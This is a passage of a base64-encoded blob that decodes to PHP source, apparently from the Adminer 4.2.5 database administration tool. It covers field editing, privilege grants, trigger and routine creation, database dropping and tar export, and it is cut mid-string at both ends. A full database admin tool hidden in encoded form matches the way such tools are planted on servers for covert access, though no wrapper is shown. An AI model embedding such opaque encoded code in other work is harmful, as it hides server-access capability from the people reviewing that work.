GVudW18c2V0ficsJG9bInR5cGUiXSkmJiRvWyJjb2xsYXRpb24iXT8iICRsYiAiLnEoJG9bImNvbGxhdGlvbiJdKToiIik7fWZ1bmN0aW9uDQpwcm9jZXNzX2ZpZWxkKCRvLCR4aCl7Z2xvYmFsJHc7JEpiPSRvWyJkZWZhdWx0Il07cmV0dXJuDQphcnJheShpZGZfZXNjYXBlKHRyaW0oJG9bImZpZWxkIl0pKSxwcm9jZXNzX3R5cGUoJHhoKSwoJG9bIm51bGwiXT8iIE5VTEwiOiIgTk9UIE5VTEwiKSwoaXNzZXQoJEpiKT8iIERFRkFVTFQgIi4oKHByZWdfbWF0Y2goJ350aW1lficsJG9bInR5cGUiXSkmJnByZWdfbWF0Y2goJ35eQ1VSUkVOVF9USU1FU1RBTVAkfmknLCRKYikpfHwoJHc9PSJzcWxpdGUiJiZwcmVnX21hdGNoKCd+XkNVUlJFTlRfKFRJTUV8VElNRVNUQU1QfERBVEUpJH5pJywkSmIpKXx8KCRvWyJ0eXBlIl09PSJiaXQiJiZwcmVnX21hdGNoKCJ+XihbMC05XSt8YidbMC0xXSsnKVwkfiIsJEpiKSl8fCgkdz09InBnc3FsIiYmcHJlZ19tYXRjaCgifl5bYS16XStcXCgoJ1teJ10qJykrXFwpXCR+IiwkSmIpKT8kSmI6cSgkSmIpKToiIiksKHByZWdfbWF0Y2goJ350aW1lc3RhbXB8ZGF0ZXRpbWV+Jywkb1sidHlwZSJdKSYmJG9bIm9uX3VwZGF0ZSJdPyIgT04gVVBEQVRFICRvW29uX3VwZGF0ZV0iOiIiKSwoc3VwcG9ydCgiY29tbWVudCIpJiYkb1siY29tbWVudCJdIT0iIj8iIENPTU1FTlQgIi5xKCRvWyJjb21tZW50Il0pOiIiKSwoJG9bImF1dG9faW5jcmVtZW50Il0/YXV0b19pbmNyZW1lbnQoKTpudWxsKSwpO31mdW5jdGlvbg0KdHlwZV9jbGFzcygkVSl7Zm9yZWFjaChhcnJheSgnY2hhcic9Pid0ZXh0JywnZGF0ZSc9Pid0aW1lfHllYXInLCdiaW5hcnknPT4nYmxvYicsJ2VudW0nPT4nc2V0JywpYXMkeD0+JFgpe2lmKHByZWdfbWF0Y2goIn4keHwkWH4iLCRVKSlyZXR1cm4iIGNsYXNzPSckeCciO319ZnVuY3Rpb24NCmVkaXRfZmllbGRzKCRwLCRtYiwkVT0iVEFCTEUiLCRNYz1hcnJheSgpLCRyYj1mYWxzZSl7Z2xvYmFsJGcsJHNkOyRwPWFycmF5X3ZhbHVlcygkcCk7ZWNobyc8dGhlYWQ+PHRyIGNsYXNzPSJ3cmFwIj4NCic7aWYoJFU9PSJQUk9DRURVUkUiKXtlY2hvJzx0ZD4mbmJzcDsnO31lY2hvJzx0aD4nLCgkVT09IlRBQkxFIj8nQ29sdW1uIG5hbWUnOidQYXJhbWV0ZXIgbmFtZScpLCc8dGQ+VHlwZTx0ZXh0YXJlYSBpZD0iZW51bS1lZGl0IiByb3dzPSI0IiBjb2xzPSIxMiIgd3JhcD0ib2ZmIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiIG9uYmx1cj0iZWRpdGluZ0xlbmd0aEJsdXIodGhpcyk7Ij48L3RleHRhcmVhPg0KPHRkPkxlbmd0aA0KPHRkPk9wdGlvbnMNCic7aWYoJFU9PSJUQUJMRSIpe2VjaG8nPHRkPk5VTEwNCjx0ZD48aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImF1dG9faW5jcmVtZW50X2NvbCIgdmFsdWU9IiI+PGFjcm9ueW0gdGl0bGU9IkF1dG8gSW5jcmVtZW50Ij5BSTwvYWNyb255bT4nLGRvY19saW5rKGFycmF5KCdzcWwnPT4iZXhhbXBsZS1hdXRvLWluY3JlbWVudC5odG1sIiwnc3FsaXRlJz0+ImF1dG9pbmMuaHRtbCIsJ3Bnc3FsJz0+ImRhdGF0eXBlLmh0bWwjREFUQVRZUEUtU0VSSUFMIiwnbXNzcWwnPT4ibXMxODY3NzUuYXNweCIsKSksJzx0ZD5EZWZhdWx0IHZhbHVlDQonLChzdXBwb3J0KCJjb21tZW50Iik/Ijx0ZCIuKCRyYj8iIjoiIGNsYXNzPSdoaWRkZW4nIikuIj4iLidDb21tZW50JzoiIik7fWVjaG8nPHRkPicsIjxpbnB1dCB0eXBlPSdpbWFnZScgY2xhc3M9J2ljb24nIG5hbWU9J2FkZFsiLihzdXBwb3J0KCJtb3ZlX2NvbCIpPzA6Y291bnQoJHApKS4iXScgc3JjPSciLmgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT1wbHVzLmdpZiZhbXA7dmVyc2lvbj00LjIuNScgYWx0PScrJyB0aXRsZT0nIi4nQWRkIG5leHQnLiInPiIsJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij5yb3dfY291bnQgPSAnLGNvdW50KCRwKSwnOzwvc2NyaXB0Pg0KPC90aGVhZD4NCjx0Ym9keSBvbmtleWRvd249InJldHVybiBlZGl0aW5nS2V5ZG93bihldmVudCk7Ij4NCic7Zm9yZWFjaCgkcA0KYXMkcz0+JG8peyRzKys7JFhlPSRvWygkX1BPU1Q/Im9yaWciOiJmaWVsZCIpXTskUWI9KGlzc2V0KCRfUE9TVFsiYWRkIl1bJHMtMV0pfHwoaXNzZXQoJG9bImZpZWxkIl0pJiYhJF9QT1NUWyJkcm9wX2NvbCJdWyRzXSkpJiYoc3VwcG9ydCgiZHJvcF9jb2wiKXx8JFhlPT0iIik7ZWNobyc8dHInLCgkUWI/IiI6IiBzdHlsZT0nZGlzcGxheTogbm9uZTsnIiksJz4NCicsKCRVPT0iUFJPQ0VEVVJFIj8iPHRkPiIuaHRtbF9zZWxlY3QoImZpZWxkc1skc11baW5vdXRdIixleHBsb2RlKCJ8Iiwkc2QpLCRvWyJpbm91dCJdKToiIiksJzx0aD4nO2lmKCRRYil7ZWNobyc8aW5wdXQgbmFtZT0iZmllbGRzWycsJHMsJ11bZmllbGRdIiB2YWx1ZT0iJyxoKCRvWyJmaWVsZCJdKSwnIiBvbmNoYW5nZT0iZWRpdGluZ05hbWVDaGFuZ2UodGhpcyk7JywoJG9bImZpZWxkIl0hPSIifHxjb3VudCgkcCk+MT8nJzonIGVkaXRpbmdBZGRSb3codGhpcyk7IiBvbmtleXVwPSJpZiAodGhpcy52YWx1ZSkgZWRpdGluZ0FkZFJvdyh0aGlzKTsnKSwnIiBtYXhsZW5ndGg9IjY0IiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4nO31lY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpZWxkc1snLCRzLCddW29yaWddIiB2YWx1ZT0iJyxoKCRYZSksJyI+DQonO2VkaXRfdHlwZSgiZmllbGRzWyRzXSIsJG8sJG1iLCRNYyk7aWYoJFU9PSJUQUJMRSIpe2VjaG8nPHRkPicsY2hlY2tib3goImZpZWxkc1skc11bbnVsbF0iLDEsJG9bIm51bGwiXSwiIiwiIiwiYmxvY2siKSwnPHRkPjxsYWJlbCBjbGFzcz0iYmxvY2siPjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0iYXV0b19pbmNyZW1lbnRfY29sIiB2YWx1ZT0iJywkcywnIic7aWYoJG9bImF1dG9faW5jcmVtZW50Il0pe2VjaG8nIGNoZWNrZWQnO30/PiBvbmNsaWNrPSJ2YXIgZmllbGQgPSB0aGlzLmZvcm1bJ2ZpZWxkc1snICsgdGhpcy52YWx1ZSArICddW2ZpZWxkXSddOyBpZiAoIWZpZWxkLnZhbHVlKSB7IGZpZWxkLnZhbHVlID0gJ2lkJzsgZmllbGQub25jaGFuZ2UoKTsgfSI+PC9sYWJlbD48dGQ+PD9waHANCmVjaG8NCmNoZWNrYm94KCJmaWVsZHNbJHNdW2hhc19kZWZhdWx0XSIsMSwkb1siaGFzX2RlZmF1bHQiXSksJzxpbnB1dCBuYW1lPSJmaWVsZHNbJywkcywnXVtkZWZhdWx0XSIgdmFsdWU9IicsaCgkb1siZGVmYXVsdCJdKSwnIiBvbmtleXVwPSJrZXl1cENoYW5nZS5jYWxsKHRoaXMpOyIgb25jaGFuZ2U9InRoaXMucHJldmlvdXNTaWJsaW5nLmNoZWNrZWQgPSB0cnVlOyI+DQonLChzdXBwb3J0KCJjb21tZW50Iik/Ijx0ZCIuKCRyYj8iIjoiIGNsYXNzPSdoaWRkZW4nIikuIj48aW5wdXQgbmFtZT0nZmllbGRzWyRzXVtjb21tZW50XScgdmFsdWU9JyIuaCgkb1siY29tbWVudCJdKS4iJyBtYXhsZW5ndGg9JyIuKCRnLT5zZXJ2ZXJfaW5mbz49NS41PzEwMjQ6MjU1KS4iJz4iOiIiKTt9ZWNobyI8dGQ+Iiwoc3VwcG9ydCgibW92ZV9jb2wiKT8iPGlucHV0IHR5cGU9J2ltYWdlJyBjbGFzcz0naWNvbicgbmFtZT0nYWRkWyRzXScgc3JjPSciLmgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT1wbHVzLmdpZiZhbXA7dmVyc2lvbj00LjIuNScgYWx0PScrJyB0aXRsZT0nIi4nQWRkIG5leHQnLiInIG9uY2xpY2s9J3JldHVybiAhZWRpdGluZ0FkZFJvdyh0aGlzLCAxKTsnPiZuYnNwOyIuIjxpbnB1dCB0eXBlPSdpbWFnZScgY2xhc3M9J2ljb24nIG5hbWU9J3VwWyRzXScgc3JjPSciLmgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT11cC5naWYmYW1wO3ZlcnNpb249NC4yLjUnIGFsdD0nXicgdGl0bGU9JyIuJ01vdmUgdXAnLiInPiZuYnNwOyIuIjxpbnB1dCB0eXBlPSdpbWFnZScgY2xhc3M9J2ljb24nIG5hbWU9J2Rvd25bJHNdJyBzcmM9JyIuaChwcmVnX3JlcGxhY2UoIn5cXD8uKn4iLCIiLE1FKSkuIj9maWxlPWRvd24uZ2lmJmFtcDt2ZXJzaW9uPTQuMi41JyBhbHQ9J3YnIHRpdGxlPSciLidNb3ZlIGRvd24nLiInPiZuYnNwOyI6IiIpLCgkWGU9PSIifHxzdXBwb3J0KCJkcm9wX2NvbCIpPyI8aW5wdXQgdHlwZT0naW1hZ2UnIGNsYXNzPSdpY29uJyBuYW1lPSdkcm9wX2NvbFskc10nIHNyYz0nIi5oKHByZWdfcmVwbGFjZSgiflxcPy4qfiIsIiIsTUUpKS4iP2ZpbGU9Y3Jvc3MuZ2lmJmFtcDt2ZXJzaW9uPTQuMi41JyBhbHQ9J3gnIHRpdGxlPSciLidSZW1vdmUnLiInIG9uY2xpY2s9XCJyZXR1cm4gIWVkaXRpbmdSZW1vdmVSb3codGhpcywgJ2ZpZWxkc1wkMVtmaWVsZF0nKTtcIj4iOiIiKSwiXG4iO319ZnVuY3Rpb24NCnByb2Nlc3NfZmllbGRzKCYkcCl7a3NvcnQoJHApOyREPTA7aWYoJF9QT1NUWyJ1cCJdKXskTmQ9MDtmb3JlYWNoKCRwDQphcyR4PT4kbyl7aWYoa2V5KCRfUE9TVFsidXAiXSk9PSR4KXt1bnNldCgkcFskeF0pO2FycmF5X3NwbGljZSgkcCwkTmQsMCxhcnJheSgkbykpO2JyZWFrO31pZihpc3NldCgkb1siZmllbGQiXSkpJE5kPSREOyREKys7fX1lbHNlaWYoJF9QT1NUWyJkb3duIl0peyRPYz1mYWxzZTtmb3JlYWNoKCRwDQphcyR4PT4kbyl7aWYoaXNzZXQoJG9bImZpZWxkIl0pJiYkT2Mpe3Vuc2V0KCRwW2tleSgkX1BPU1RbImRvd24iXSldKTthcnJheV9zcGxpY2UoJHAsJEQsMCxhcnJheSgkT2MpKTticmVhazt9aWYoa2V5KCRfUE9TVFsiZG93biJdKT09JHgpJE9jPSRvOyREKys7fX1lbHNlaWYoJF9QT1NUWyJhZGQiXSl7JHA9YXJyYXlfdmFsdWVzKCRwKTthcnJheV9zcGxpY2UoJHAsa2V5KCRfUE9TVFsiYWRkIl0pLDAsYXJyYXkoYXJyYXkoKSkpO31lbHNlaWYoISRfUE9TVFsiZHJvcF9jb2wiXSlyZXR1cm4NCmZhbHNlO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCm5vcm1hbGl6ZV9lbnVtKCRCKXtyZXR1cm4iJyIuc3RyX3JlcGxhY2UoIiciLCInJyIsYWRkY3NsYXNoZXMoc3RyaXBjc2xhc2hlcyhzdHJfcmVwbGFjZSgkQlswXVswXS4kQlswXVswXSwkQlswXVswXSxzdWJzdHIoJEJbMF0sMSwtMSkpKSwnXFwnKSkuIiciO31mdW5jdGlvbg0KZ3JhbnQoJFRjLCREZiwkZiwkSWUpe2lmKCEkRGYpcmV0dXJuDQp0cnVlO2lmKCREZj09YXJyYXkoIkFMTCBQUklWSUxFR0VTIiwiR1JBTlQgT1BUSU9OIikpcmV0dXJuKCRUYz09IkdSQU5UIj9xdWVyaWVzKCIkVGMgQUxMIFBSSVZJTEVHRVMkSWUgV0lUSCBHUkFOVCBPUFRJT04iKTpxdWVyaWVzKCIkVGMgQUxMIFBSSVZJTEVHRVMkSWUiKSYmcXVlcmllcygiJFRjIEdSQU5UIE9QVElPTiRJZSIpKTtyZXR1cm4NCnF1ZXJpZXMoIiRUYyAiLnByZWdfcmVwbGFjZSgnfihHUkFOVCBPUFRJT04pXFwoW14pXSpcXCl+JywnXFwxJyxpbXBsb2RlKCIkZiwgIiwkRGYpLiRmKS4kSWUpO31mdW5jdGlvbg0KZHJvcF9jcmVhdGUoJFdiLCRpLCRYYiwkY2gsJFpiLCRBLCRsZSwkamUsJGtlLCRGZSwkd2Upe2lmKCRfUE9TVFsiZHJvcCJdKXF1ZXJ5X3JlZGlyZWN0KCRXYiwkQSwkbGUpO2Vsc2VpZigkRmU9PSIiKXF1ZXJ5X3JlZGlyZWN0KCRpLCRBLCRrZSk7ZWxzZWlmKCRGZSE9JHdlKXskQmI9cXVlcmllcygkaSk7cXVlcmllc19yZWRpcmVjdCgkQSwkamUsJEJiJiZxdWVyaWVzKCRXYikpO2lmKCRCYilxdWVyaWVzKCRYYik7fWVsc2UNCnF1ZXJpZXNfcmVkaXJlY3QoJEEsJGplLHF1ZXJpZXMoJGNoKSYmcXVlcmllcygkWmIpJiZxdWVyaWVzKCRXYikmJnF1ZXJpZXMoJGkpKTt9ZnVuY3Rpb24NCmNyZWF0ZV90cmlnZ2VyKCRJZSwkSyl7Z2xvYmFsJHc7JGhoPSIgJEtbVGltaW5nXSAkS1tFdmVudF0iLigkS1siRXZlbnQiXT09IlVQREFURSBPRiI/IiAiLmlkZl9lc2NhcGUoJEtbIk9mIl0pOiIiKTtyZXR1cm4iQ1JFQVRFIFRSSUdHRVIgIi5pZGZfZXNjYXBlKCRLWyJUcmlnZ2VyIl0pLigkdz09Im1zc3FsIj8kSWUuJGhoOiRoaC4kSWUpLnJ0cmltKCIgJEtbVHlwZV1cbiRLW1N0YXRlbWVudF0iLCI7IikuIjsiO31mdW5jdGlvbg0KY3JlYXRlX3JvdXRpbmUoJGVnLCRLKXtnbG9iYWwkc2Q7JE89YXJyYXkoKTskcD0oYXJyYXkpJEtbImZpZWxkcyJdO2tzb3J0KCRwKTtmb3JlYWNoKCRwDQphcyRvKXtpZigkb1siZmllbGQiXSE9IiIpJE9bXT0ocHJlZ19tYXRjaCgifl4oJHNkKVwkfiIsJG9bImlub3V0Il0pPyIkb1tpbm91dF0gIjoiIikuaWRmX2VzY2FwZSgkb1siZmllbGQiXSkucHJvY2Vzc190eXBlKCRvLCJDSEFSQUNURVIgU0VUIik7fXJldHVybiJDUkVBVEUgJGVnICIuaWRmX2VzY2FwZSh0cmltKCRLWyJuYW1lIl0pKS4iICgiLmltcGxvZGUoIiwgIiwkTykuIikiLihpc3NldCgkX0dFVFsiZnVuY3Rpb24iXSk/IiBSRVRVUk5TIi5wcm9jZXNzX3R5cGUoJEtbInJldHVybnMiXSwiQ0hBUkFDVEVSIFNFVCIpOiIiKS4oJEtbImxhbmd1YWdlIl0/IiBMQU5HVUFHRSAkS1tsYW5ndWFnZV0iOiIiKS5ydHJpbSgiXG4kS1tkZWZpbml0aW9uXSIsIjsiKS4iOyI7fWZ1bmN0aW9uDQpyZW1vdmVfZGVmaW5lcigkSCl7cmV0dXJuDQpwcmVnX3JlcGxhY2UoJ35eKFtBLVogPV0rKSBERUZJTkVSPWAnLnByZWdfcmVwbGFjZSgnfkAoLiopficsJ2BAYCglfFxcMSknLGxvZ2dlZF91c2VyKCkpLidgficsJ1xcMScsJEgpO31mdW5jdGlvbg0KZm9ybWF0X2ZvcmVpZ25fa2V5KCRxKXtnbG9iYWwkSmU7cmV0dXJuIiBGT1JFSUdOIEtFWSAoIi5pbXBsb2RlKCIsICIsYXJyYXlfbWFwKCdpZGZfZXNjYXBlJywkcVsic291cmNlIl0pKS4iKSBSRUZFUkVOQ0VTICIudGFibGUoJHFbInRhYmxlIl0pLiIgKCIuaW1wbG9kZSgiLCAiLGFycmF5X21hcCgnaWRmX2VzY2FwZScsJHFbInRhcmdldCJdKSkuIikiLihwcmVnX21hdGNoKCJ+XigkSmUpXCR+IiwkcVsib25fZGVsZXRlIl0pPyIgT04gREVMRVRFICRxW29uX2RlbGV0ZV0iOiIiKS4ocHJlZ19tYXRjaCgifl4oJEplKVwkfiIsJHFbIm9uX3VwZGF0ZSJdKT8iIE9OIFVQREFURSAkcVtvbl91cGRhdGVdIjoiIik7fWZ1bmN0aW9uDQp0YXJfZmlsZSgkR2MsJG1oKXskSj1wYWNrKCJhMTAwYThhOGE4YTEyYTEyIiwkR2MsNjQ0LDAsMCxkZWNvY3QoJG1oLT5zaXplKSxkZWNvY3QodGltZSgpKSk7JGViPTgqMzI7Zm9yKCRzPTA7JHM8c3RybGVuKCRKKTskcysrKSRlYis9b3JkKCRKWyRzXSk7JEouPXNwcmludGYoIiUwNm8iLCRlYikuIlwwICI7ZWNobyRKLHN0cl9yZXBlYXQoIlwwIiw1MTItc3RybGVuKCRKKSk7JG1oLT5zZW5kKCk7ZWNobw0Kc3RyX3JlcGVhdCgiXDAiLDUxMS0oJG1oLT5zaXplKzUxMSklNTEyKTt9ZnVuY3Rpb24NCmluaV9ieXRlcygkcmQpeyRYPWluaV9nZXQoJHJkKTtzd2l0Y2goc3RydG9sb3dlcihzdWJzdHIoJFgsLTEpKSl7Y2FzZSdnJzokWCo9MTAyNDtjYXNlJ20nOiRYKj0xMDI0O2Nhc2Unayc6JFgqPTEwMjQ7fXJldHVybiRYO31mdW5jdGlvbg0KZG9jX2xpbmsoJG9mKXtnbG9iYWwkdywkZzskSmg9YXJyYXkoJ3NxbCc9PiJodHRwOi8vZGV2Lm15c3FsLmNvbS9kb2MvcmVmbWFuLyIuc3Vic3RyKCRnLT5zZXJ2ZXJfaW5mbywwLDMpLiIvZW4vIiwnc3FsaXRlJz0+Imh0dHA6Ly93d3cuc3FsaXRlLm9yZy8iLCdwZ3NxbCc9PiJodHRwOi8vd3d3LnBvc3RncmVzcWwub3JnL2RvY3MvIi5zdWJzdHIoJGctPnNlcnZlcl9pbmZvLDAsMykuIi9zdGF0aWMvIiwnbXNzcWwnPT4iaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9saWJyYXJ5LyIsJ29yYWNsZSc9PiJodHRwOi8vZG93bmxvYWQub3JhY2xlLmNvbS9kb2NzL2NkL0IxOTMwNl8wMS9zZXJ2ZXIuMTAyL2IxNDIwMC8iLCk7cmV0dXJuKCRvZlskd10/IjxhIGhyZWY9JyRKaFskd10kb2ZbJHddJyB0YXJnZXQ9J19ibGFuaycgcmVsPSdub3JlZmVycmVyJz48c3VwPj88L3N1cD48L2E+IjoiIik7fWZ1bmN0aW9uDQpvYl9nemVuY29kZSgkUCl7cmV0dXJuDQpnemVuY29kZSgkUCk7fWZ1bmN0aW9uDQpkYl9zaXplKCRtKXtnbG9iYWwkZztpZighJGctPnNlbGVjdF9kYigkbSkpcmV0dXJuIj8iOyRKPTA7Zm9yZWFjaCh0YWJsZV9zdGF0dXMoKWFzJFIpJEorPSRSWyJEYXRhX2xlbmd0aCJdKyRSWyJJbmRleF9sZW5ndGgiXTtyZXR1cm4NCmZvcm1hdF9udW1iZXIoJEopO31mdW5jdGlvbg0Kc2V0X3V0ZjhtYjQoJGkpe2dsb2JhbCRnO3N0YXRpYyRPPWZhbHNlO2lmKCEkTyYmcHJlZ19tYXRjaCgnflxidXRmOG1iNH5pJywkaSkpeyRPPXRydWU7ZWNobyJTRVQgTkFNRVMgIi5jaGFyc2V0KCRnKS4iO1xuXG4iO319ZnVuY3Rpb24NCmNvbm5lY3RfZXJyb3IoKXtnbG9iYWwkYiwkZywkVCwkbiwkVmI7aWYoREIhPSIiKXtoZWFkZXIoIkhUVFAvMS4xIDQwNCBOb3QgRm91bmQiKTtwYWdlX2hlYWRlcignRGF0YWJhc2UnLiI6ICIuaChEQiksJ0ludmFsaWQgZGF0YWJhc2UuJyx0cnVlKTt9ZWxzZXtpZigkX1BPU1RbImRiIl0mJiEkbilxdWVyaWVzX3JlZGlyZWN0KHN1YnN0cihNRSwwLC0xKSwnRGF0YWJhc2VzIGhhdmUgYmVlbiBkcm9wcGVkLicsZHJvcF9kYXRhYmFzZXMoJF9QT1NUWyJkYiJdKSk7cGFnZV9oZWFkZXIoJ1NlbGVjdCBkYXRhYmFzZScsJG4sZmFsc2UpO2VjaG8iPHAgY2xhc3M9J2xpbmtzJz5cbiI7Zm9yZWFjaChhcnJheSgnZGF0YWJhc2UnPT4nQ3JlYXRlIG5ldyBkYXRhYmFzZScsJ3ByaXZpbGVnZXMnPT4nUHJpdmlsZWdlcycsJ3Byb2Nlc3NsaXN0Jz0+J1Byb2Nlc3MgbGlzdCcsJ3ZhcmlhYmxlcyc9PidWYXJpYWJsZXMnLCdzdGF0dXMnPT4nU3RhdHVzJywpYXMkeD0+JFgpe2lmKHN1cHBvcnQoJHgpKWVjaG8iPGEgaHJlZj0nIi5oKE1FKS4iJHg9Jz4kWDwvYT5cbiI7fWVjaG8iPHA+Ii5zcHJpbnRmKCclcyB2ZXJzaW9uOiAlcyB0aHJvdWdoIFBIUCBleHRlbnNpb24gJXMnLCRWYltEUklWRVJdLCI8Yj4iLmgoJGctPnNlcnZlcl9pbmZvKS4iPC9iPiIsIjxiPiRnLT5leHRlbnNpb248L2I+IikuIlxuIiwiPHA+Ii5zcHJpbnRmKCdMb2dnZWQgYXM6ICVzJywiPGI+Ii5oKGxvZ2dlZF91c2VyKCkpLiI8L2I+IikuIlxuIjskbD0kYi0+ZGF0YWJhc2VzKCk7aWYoJGwpeyRsZz1zdXBwb3J0KCJzY2hlbWUiKTskbWI9Y29sbGF0aW9ucygpO2VjaG8iPGZvcm0gYWN0aW9uPScnIG1ldGhvZD0ncG9zdCc+XG4iLCI8dGFibGUgY2VsbHNwYWNpbmc9JzAnIGNsYXNzPSdjaGVja2FibGUnIG9uY2xpY2s9J3RhYmxlQ2xpY2soZXZlbnQpOycgb25kYmxjbGljaz0ndGFibGVDbGljayhldmVudCwgdHJ1ZSk7Jz5cbiIsIjx0aGVhZD48dHI+Ii4oc3VwcG9ydCgiZGF0YWJhc2UiKT8iPHRkPiZuYnNwOyI6IiIpLiI8dGg+Ii4nRGF0YWJhc2UnLiIgLSA8YSBocmVmPSciLmgoTUUpLiJyZWZyZXNoPTEnPiIuJ1JlZnJlc2gnLiI8L2E+Ii4iPHRkPiIuJ0NvbGxhdGlvbicuIjx0ZD4iLidUYWJsZXMnLiI8dGQ+Ii4nU2l6ZScuIiAtIDxhIGhyZWY9JyIuaChNRSkuImRic2l6ZT0xJyBvbmNsaWNrPVwicmV0dXJuICFhamF4U2V0SHRtbCgnIi5oKGpzX2VzY2FwZShNRSkpLiJzY3JpcHQ9Y29ubmVjdCcpO1wiPiIuJ0NvbXB1dGUnLiI8L2E+Ii4iPC90aGVhZD5cbiI7JGw9KCRfR0VUWyJkYnNpemUiXT9jb3VudF90YWJsZXMoJGwpOmFycmF5X2ZsaXAoJGwpKTtmb3JlYWNoKCRsDQphcyRtPT4kUyl7JGRnPWgoTUUpLiJkYj0iLnVybGVuY29kZSgkbSk7ZWNobyI8dHIiLm9kZCgpLiI+Ii4oc3VwcG9ydCgiZGF0YWJhc2UiKT8iPHRkPiIuY2hlY2tib3goImRiW10iLCRtLGluX2FycmF5KCRtLChhcnJheSkkX1BPU1RbImRiIl0pKToiIiksIjx0aD48YSBocmVmPSckZGcnPiIuaCgkbSkuIjwvYT4iOyRkPW5ic3AoZGJfY29sbGF0aW9uKCRtLCRtYikpO2VjaG8iPHRkPiIuKHN1cHBvcnQoImRhdGFiYXNlIik/IjxhIGhyZWY9JyRkZyIuKCRsZz8iJmFtcDtucz0iOiIiKS4iJmFtcDtkYXRhYmFzZT0nIHRpdGxlPSciLidBbHRlciBkYXRhYmFzZScuIic+JGQ8L2E+IjokZCksIjx0ZCBhbGlnbj0ncmlnaHQnPjxhIGhyZWY9JyRkZyZhbXA7c2NoZW1hPScgaWQ9J3RhYmxlcy0iLmgoJG0pLiInIHRpdGxlPSciLidEYXRhYmFzZSBzY2hlbWEnLiInPiIuKCRfR0VUWyJkYnNpemUiXT8kUzoiPyIpLiI8L2E+IiwiPHRkIGFsaWduPSdyaWdodCcgaWQ9J3NpemUtIi5oKCRtKS4iJz4iLigkX0dFVFsiZGJzaXplIl0/ZGJfc2l6ZSgkbSk6Ij8iKSwiXG4iO31lY2hvIjwvdGFibGU+XG4iLChzdXBwb3J0KCJkYXRhYmFzZSIpPyI8ZmllbGRzZXQ+PGxlZ2VuZD4iLidTZWxlY3RlZCcuIiA8c3BhbiBpZD0nc2VsZWN0ZWQnPjwvc3Bhbj48L2xlZ2VuZD48ZGl2PlxuIi4iPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWxsJyB2YWx1ZT0nJyBvbmNsaWNrPVwic2VsZWN0Q291bnQoJ3NlbGVjdGVkJywgZm9ybUNoZWNrZWQodGhpcywgL15kYi8pKTtcIj5cbiIuIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2Ryb3AnIHZhbHVlPSciLidEcm9wJy4iJyIuY29uZmlybSgpLiI+XG4iLiI8L2Rpdj48L2ZpZWxkc2V0PlxuIjoiIiksIjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz50YWJsZUNoZWNrKCk7PC9zY3JpcHQ+XG4iLCI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSd0b2tlbicgdmFsdWU9JyRUJz5cbiIsIjwvZm9ybT5cbiI7fX1wYWdlX2Zvb3RlcigiZGIiKTt9aWYoaXNzZXQoJF9HRVRbInN0YXR1cyJdKSkkX0dFVFsidmFyaWFibGVzIl09JF9HRVRbInN0YXR1cyJdO2lmKGlzc2V0KCRfR0VUWyJpbXBvcnQiXSkpJF9HRVRbInNxbCJdPSRfR0VUWyJpbXBvcnQiXTtpZighKERCIT0iIj8kZy0+c2VsZWN0X2RiKERCKTppc3NldCgkX0dFVFsic3FsIl0pfHxpc3NldCgkX0dFVFsiZHVtcCJdKXx8aXNzZXQoJF9HRVRbImRhdGFiYXNlIl0pfHxpc3NldCgkX0dFVFsicHJvY2Vzc2xpc3QiXSl8fGlzc2V0KCRfR0VUWyJwcml2aWxlZ2VzIl0pfHxpc3NldCgkX0dFVFsidXNlciJdKXx8aXNzZXQoJF9HRVRbInZhcmlhYmxlcyJdKXx8JF9HRVRbInNjcmlwdCJdPT0iY29ubmVjdCJ8fCRfR0VUWyJzY3JpcHQiXT09ImtpbGwiKSl7aWYoREIhPSIifHwkX0dFVFsicmVmcmVzaCJdKXtyZXN0YXJ0X3Nlc3Npb24oKTtzZXRfc2Vzc2lvbigiZGJzIixudWxsKTt9Y29ubmVjdF9lcnJvcigpO2V4aXQ7fWlmKHN1cHBvcnQoInNjaGVtZSIpJiZEQiE9IiImJiRfR0VUWyJucyJdIT09IiIpe2lmKCFpc3NldCgkX0dFVFsibnMiXSkpcmVkaXJlY3QocHJlZ19yZXBsYWNlKCd+bnM9W14mXSomficsJycsTUUpLiJucz0iLmdldF9zY2hlbWEoKSk7aWYoIXNldF9zY2hlbWEoJF9HRVRbIm5zIl0pKXtoZWFkZXIoIkhUVFAvMS4xIDQwNCBOb3QgRm91bmQiKTtwYWdlX2hlYWRlcignU2NoZW1hJy4iOiAiLmgoJF9HRVRbIm5zIl0pLCdJbnZhbGlkIHNjaGVtYS4nLHRydWUpO3BhZ2VfZm9vdGVyKCJucyIpO2V4aXQ7fX0kSmU9IlJFU1RSSUNUfE5PIEFDVElPTnxDQVNDQURFfFNFVCBOVUxMfFNFVCBERUZBVUxUIjtjbGFzcw0KVG1wRmlsZXt2YXIkaGFuZGxlcjt2YXIkc2l6ZTtmdW5jdGlvbg0KX19jb25zdHJ1Y3QoKXskdGhpcy0+aGFuZGxlcj10bXBmaWxlKCk7fWZ1bmN0aW9uDQp3cml0ZSgkd2IpeyR0aGlzLT5zaXplKz1zdHJsZW4oJHdiKTtmd3JpdGUoJHRoaXMtPmhhbmRsZXIsJHdiKTt9ZnVuY3Rpb24NCnNlbmQoKXtmc2VlaygkdGhpcy0+aGFuZGxlciwwKTtmcGFzc3RocnUoJHRoaXMtPmhhbmRsZXIpO2ZjbG9zZSgkdGhpcy0+aGFuZGxlcik7fX0kbmM9IicoPzonJ3xbXidcXFxcXXxcXFxcLikqJyI7JHNkPSJJTnxPVVR8SU5PVVQiO2lmKGlzc2V0KCRfR0VUWyJzZWxlY3QiXSkmJigkX1BPU1RbImVkaXQiXXx8JF9QT1NUWyJjbG9uZSJdKSYmISRfUE9TVFsic